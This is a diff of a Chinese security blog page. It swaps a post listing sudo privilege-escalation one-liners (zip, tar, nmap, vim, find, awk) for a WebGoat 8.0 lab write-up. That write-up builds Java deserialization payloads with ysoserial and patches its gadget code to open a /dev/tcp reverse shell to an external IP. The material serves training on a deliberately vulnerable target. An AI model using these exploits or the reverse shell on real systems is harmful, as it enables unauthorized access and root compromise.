@@ -108,25 +108,38 @@
 
 
 
-  <meta name="description" content="参考文献：http://zone.secevery.com/article/989             https://www.anquanke.com/post/id/158511 sudo概念：sudo （Substitute User and Do 的简写）临时授权，可以临时让其以root 权限运行某个程序。在/etc/sudoers中设置了可执行sudo指令的用户。 各种提权操作①su">
-<meta name="keywords" content="漏洞学习">
+  <meta name="description" content="安装Webgoat靶场12docker pull webgoat/webgoat-8.0docker run -p 8080:8080 -t webgoat/webgoat-8.0 访问：192.168.58.147:8080/WebGoat，可直接访问则搭建成功，进去之后注册个账号。 解题分析 查看题目  反编译webgoat-server的jar包，查看BOOT-INF/lib/insecur">
+<meta name="keywords" content="java学习">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sudo提权">
-<meta property="og:url" content="https://cws6.github.io/2018/09/26/sudo提权/index.html">
+<meta property="og:title" content="Webgoat8.0反序列化获取shell">
+<meta property="og:url" content="https://cws6.github.io/2019/06/18/Webgoat8-0反序列化获取shell/index.html">
 <meta property="og:site_name" content="cws6">
-<meta property="og:description" content="参考文献：http://zone.secevery.com/article/989             https://www.anquanke.com/post/id/158511 sudo概念：sudo （Substitute User and Do 的简写）临时授权，可以临时让其以root 权限运行某个程序。在/etc/sudoers中设置了可执行sudo指令的用户。 各种提权操作①su">
+<meta property="og:description" content="安装Webgoat靶场12docker pull webgoat/webgoat-8.0docker run -p 8080:8080 -t webgoat/webgoat-8.0 访问：192.168.58.147:8080/WebGoat，可直接访问则搭建成功，进去之后注册个账号。 解题分析 查看题目  反编译webgoat-server的jar包，查看BOOT-INF/lib/insecur">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-03T13:41:54.691Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-4d9e668bd81a7f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-45d44b9e406d6322.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-b397fcd501058f0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-668d3ee4a546f5f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-83ed44790da69cfb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-2322cee85dd061ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-eb9ef193735ab120.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-a5fb0d00f13870f2.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-b194b08095ce0c94.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-75b0be92dcc4f5b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-f711ff80eb7c3814.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-46953a58397e5d70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-06-18T13:46:45.827Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sudo提权">
-<meta name="twitter:description" content="参考文献：http://zone.secevery.com/article/989             https://www.anquanke.com/post/id/158511 sudo概念：sudo （Substitute User and Do 的简写）临时授权，可以临时让其以root 权限运行某个程序。在/etc/sudoers中设置了可执行sudo指令的用户。 各种提权操作①su">
+<meta name="twitter:title" content="Webgoat8.0反序列化获取shell">
+<meta name="twitter:description" content="安装Webgoat靶场12docker pull webgoat/webgoat-8.0docker run -p 8080:8080 -t webgoat/webgoat-8.0 访问：192.168.58.147:8080/WebGoat，可直接访问则搭建成功，进去之后注册个账号。 解题分析 查看题目  反编译webgoat-server的jar包，查看BOOT-INF/lib/insecur">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-4d9e668bd81a7f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
 
 
 
-  <link rel="canonical" href="https://cws6.github.io/2018/09/26/sudo提权/">
+  <link rel="canonical" href="https://cws6.github.io/2019/06/18/Webgoat8-0反序列化获取shell/">
 
 
 
@@ -136,7 +149,7 @@
   };
 </script>
 
-  <title>sudo提权 | cws6</title>
+  <title>Webgoat8.0反序列化获取shell | cws6</title>
   
 
 
@@ -323,7 +336,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2018/09/26/sudo提权/">
+    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2019/06/18/Webgoat8-0反序列化获取shell/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cws6">
@@ -340,7 +353,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sudo提权
+          <h1 class="post-title" itemprop="name headline">Webgoat8.0反序列化获取shell
               
             
           </h1>
@@ -365,24 +378,12 @@
                 
               
 
-              <time title="Created: 2018-09-26 20:26:19" itemprop="dateCreated datePublished" datetime="2018-09-26T20:26:19+08:00">2018-09-26</time>
+              <time title="Created: 2019-06-18 21:44:48 / Modified: 21:46:45" itemprop="dateCreated datePublished" datetime="2019-06-18T21:44:48+08:00">2019-06-18</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2018-12-03 21:41:54" itemprop="dateModified" datetime="2018-12-03T21:41:54+08:00">2018-12-03</time>
               
             
           </span>
@@ -415,21 +416,66 @@
       
 
       
-        <p>参考文献：<a href="http://zone.secevery.com/article/989" target="_blank" rel="noopener">http://zone.secevery.com/article/989</a><br>             <a href="https://www.anquanke.com/post/id/158511" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158511</a></p>
-<h4 id="sudo概念："><a href="#sudo概念：" class="headerlink" title="sudo概念："></a>sudo概念：</h4><p>sudo （Substitute User and Do 的简写）临时授权，可以临时让其以root 权限运行某个程序。在<code>/etc/sudoers</code>中设置了可执行<code>sudo指令</code>的用户。</p>
-<h4 id="各种提权操作"><a href="#各种提权操作" class="headerlink" title="各种提权操作"></a>各种提权操作</h4><p><strong>①su</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$ sudo su - root</span><br></pre></td></tr></table></figure></p>
-<p><strong>②zip</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$ sudo zip /tmp/1.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;#1.zip是随手添加进去的一个zip文件</span><br><span class="line">#-T 表示测试1.zip的完整性</span><br><span class="line"># --unzip-command 与-T 一起使用，可以指定自定义命令用于解压1.zip</span><br><span class="line">#可以自定义用于解压test.zip 的的命令，自定义解压命令是以root权限执行的，指定为sh -c /bin/bash, 获取一个root权限的shell</span><br></pre></td></tr></table></figure></p>
-<p><strong>③tar</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/bash</span><br><span class="line">#–checkpoint-action 选项是提权点，可以自定义需要执行的动作，指定为exec=/bin/bash，获取一个root权限的shell</span><br></pre></td></tr></table></figure></p>
-<p><strong>④strace</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$sudo strace -o/dev/null /bin/bash</span><br><span class="line">#strace 以root权限运行跟踪调试/bin/bash, 从而获取root权限的shell</span><br></pre></td></tr></table></figure></p>
-<p><strong>⑤nmap</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$ echo &quot;os.execute(&apos;/bin/sh&apos;)&quot;&gt;/tmp/shell.nse</span><br><span class="line">test@ubuntu:/tmp$ sudo nmap --script=/tmp/shell.nse</span><br></pre></td></tr></table></figure></p>
-<p><strong>⑥more</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$sudo more /etc/rsyslog.conf</span><br><span class="line">然后加上!/bin/bash 即可获取root权限的shell</span><br></pre></td></tr></table></figure></p>
-<p><strong>⑦git</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$sudo git help status</span><br><span class="line">然后加上!/bin/bash 即可获取root权限的shell</span><br></pre></td></tr></table></figure></p>
-<p><strong>⑧ftp</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$ sudo ftp</span><br><span class="line">ftp&gt; !/bin/bash</span><br></pre></td></tr></table></figure></p>
-<p><strong>⑨vim</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$ sudo vim -c &apos;!sh</span><br></pre></td></tr></table></figure></p>
-<p><strong>⑩find</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$ sudo find /bin/ -name ls -exec /bin/bash \;</span><br><span class="line">#对于find 检索到的每一个结果，都执行/bin/bash, 是以root权限执行的</span><br></pre></td></tr></table></figure></p>
-<p><strong>⑩①passwd</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/tmp$ sudo passwd</span><br><span class="line">Enter new UNIX password: </span><br><span class="line">Retype new UNIX password:</span><br></pre></td></tr></table></figure></p>
-<p><strong>⑩②awk</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test@ubuntu:/etc$ sudo awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure></p>
-<h4 id="防止有sudo权限的普通用户修改root用户的密码"><a href="#防止有sudo权限的普通用户修改root用户的密码" class="headerlink" title="防止有sudo权限的普通用户修改root用户的密码"></a>防止有sudo权限的普通用户修改root用户的密码</h4><p>在<code>/etc/sudoers</code>添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test  ALL=(root)     !/usr/bin/passwd, /usr/bin/passwd [A-Za-z]*, !/usr/bin/passwd root</span><br><span class="line">#用户账号，登陆来源的主机名，可切换的身份，可执行的命令</span><br></pre></td></tr></table></figure></p>
+        <h4 id="安装Webgoat靶场"><a href="#安装Webgoat靶场" class="headerlink" title="安装Webgoat靶场"></a>安装Webgoat靶场</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull webgoat/webgoat-8.0</span><br><span class="line">docker run -p 8080:8080 -t webgoat/webgoat-8.0</span><br></pre></td></tr></table></figure>
+<p>访问：<code>192.168.58.147:8080/WebGoat</code>，可直接访问则搭建成功，进去之后注册个账号。</p>
+<h4 id="解题分析"><a href="#解题分析" class="headerlink" title="解题分析"></a>解题分析</h4><ul>
+<li><p>查看题目<br><img src="https://upload-images.jianshu.io/upload_images/5035860-4d9e668bd81a7f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+</li>
+<li><p>反编译<code>webgoat-server</code>的jar包，查看<code>BOOT-INF/lib/insecure-deserialization-8.0.0.M25.jar</code>存在反序列化漏洞，且编码是<code>base64url</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-45d44b9e406d6322.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+</li>
+<li>查看jar包的组件，<code>groovy</code>,<code>hibernate-core</code>,<code>spring-core</code>可能存在反序列化漏洞。</li>
+</ul>
+<h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><p><strong>使用<code>hibernate-core 5</code>生成payload</strong></p>
+<ul>
+<li>将<code>webgoat-server/BOOT-INF/lib</code>下的<code>hibernate-core.jar</code>复制到<code>ysoserial.jar</code>同一目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dhibernate5 -cp hibernate-core-5.0.12.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload Hibernate1 &quot;touch /tmp/test&quot; | base64 -w0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-b397fcd501058f0e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>将数据进行提交得到，利用成功<br><img src="https://upload-images.jianshu.io/upload_images/5035860-668d3ee4a546f5f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+</ul>
+<p><strong>使用spring生成payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Spring1 &quot;touch /tmp/test1&quot; | base64 -w0</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>将数据进行提交，并没有利用成功<br><img src="https://upload-images.jianshu.io/upload_images/5035860-83ed44790da69cfb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+</ul>
+<p><strong>使用groovy生成payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Groovy1 &quot;touch /tmp/test1&quot; | base64 -w0</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>将数据进行提交，同样没有利用成功<br><img src="https://upload-images.jianshu.io/upload_images/5035860-2322cee85dd061ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-eb9ef193735ab120.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.jpg"></p>
+<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><ul>
+<li><p>题目要求是服务器睡眠5s，利用<code>hibernate-core 5</code>生成payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dhibernate5 -cp hibernate-core-5.0.12.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload Hibernate1 &quot;sleep 5&quot; | base64 -w0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>并没有执行成功，查看进程已经执行，但是发现请求并非在执行sleep后并未等待命令结束就已经返回结果，需要将此处等待进程结束后返回，需要针对ysoserial的执行命令进行调整，重新生成payload进行测试。</p>
+</li>
+<li>ysoserial的生成Payload流程<br><img src="https://upload-images.jianshu.io/upload_images/5035860-a5fb0d00f13870f2.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li><p>最终会进入到 <code>ysoserial.payloads.util.Gadgets::createTemplatesImpl()</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-b194b08095ce0c94.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+</li>
+<li><p>生成Payload的关键代码是箭头所指的地方。其中的command是攻击者输入。可以直接修改这个cmd为我们的命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd = &quot;java.lang.Runtime.getRuntime().exec(new String []&#123;\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;sleep 5\&quot;&#125;).waitFor();&quot;;</span><br><span class="line"> clazz.makeClassInitializer().insertAfter(cmd);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后运行<code>mvn clean package -DskipTests</code>重新编译<code>ysoserial.jar</code></p>
+</li>
+<li>使用下面的命令重新生成下，并将数据进行提交。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dhibernate5 -cp hibernate-core-5.0.12.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload Hibernate1 &quot;anything&quot; | base64 -w0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-75b0be92dcc4f5b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><ul>
+<li><p>同上可以直接修改这个cmd为我们的的反弹shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd = &quot;java.lang.Runtime.getRuntime().exec(new String []&#123;\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;exec 5&lt;&gt;/dev/tcp/47.xxx.xxx.xxx.xxx/8080;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\&quot;&#125;).waitFor();&quot;;</span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后运行<code>mvn clean package -DskipTests</code>重新编译<code>ysoserial.jar</code></p>
+</li>
+<li>使用下面命令生成payload<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dhibernate5 -cp hibernate-core-5.0.12.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload Hibernate1 &quot;anything&quot; | base64 -w0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-f711ff80eb7c3814.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<ul>
+<li>将数据进行提交，成功得到shell<br><img src="https://upload-images.jianshu.io/upload_images/5035860-46953a58397e5d70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+</ul>
+<hr>
+<p>参考文献：<br><a href="https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</a><br><a href="https://www.jianshu.com/p/0c45058e1723" target="_blank" rel="noopener">https://www.jianshu.com/p/0c45058e1723</a></p>
 
       
     </div>
@@ -462,7 +508,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞学习/" rel="tag"># 漏洞学习</a>
+            <a href="/tags/java学习/" rel="tag"># java学习</a>
           
         </div>
       
@@ -475,8 +521,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/09/24/防火墙的vpn技术/" rel="next" title="防火墙的vpn技术">
-                <i class="fa fa-chevron-left"></i> 防火墙的vpn技术
+              <a href="/2019/06/14/ssrf在mysql中的利用/" rel="next" title="ssrf在mysql中的利用">
+                <i class="fa fa-chevron-left"></i> ssrf在mysql中的利用
               </a>
             
           </div>
@@ -484,10 +530,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/10/JWT利用/" rel="prev" title="JWT利用">
-                JWT利用 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -657,7 +699,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#sudo概念："><span class="nav-number">1.</span> <span class="nav-text">sudo概念：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#各种提权操作"><span class="nav-number">2.</span> <span class="nav-text">各种提权操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防止有sudo权限的普通用户修改root用户的密码"><span class="nav-number">3.</span> <span class="nav-text">防止有sudo权限的普通用户修改root用户的密码</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#安装Webgoat靶场"><span class="nav-number">1.</span> <span class="nav-text">安装Webgoat靶场</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题分析"><span class="nav-number">2.</span> <span class="nav-text">解题分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#生成payload"><span class="nav-number">3.</span> <span class="nav-text">生成payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题过程"><span class="nav-number">4.</span> <span class="nav-text">解题过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反弹shell"><span class="nav-number">5.</span> <span class="nav-text">反弹shell</span></a></li></ol></div>
             
 
           </div>
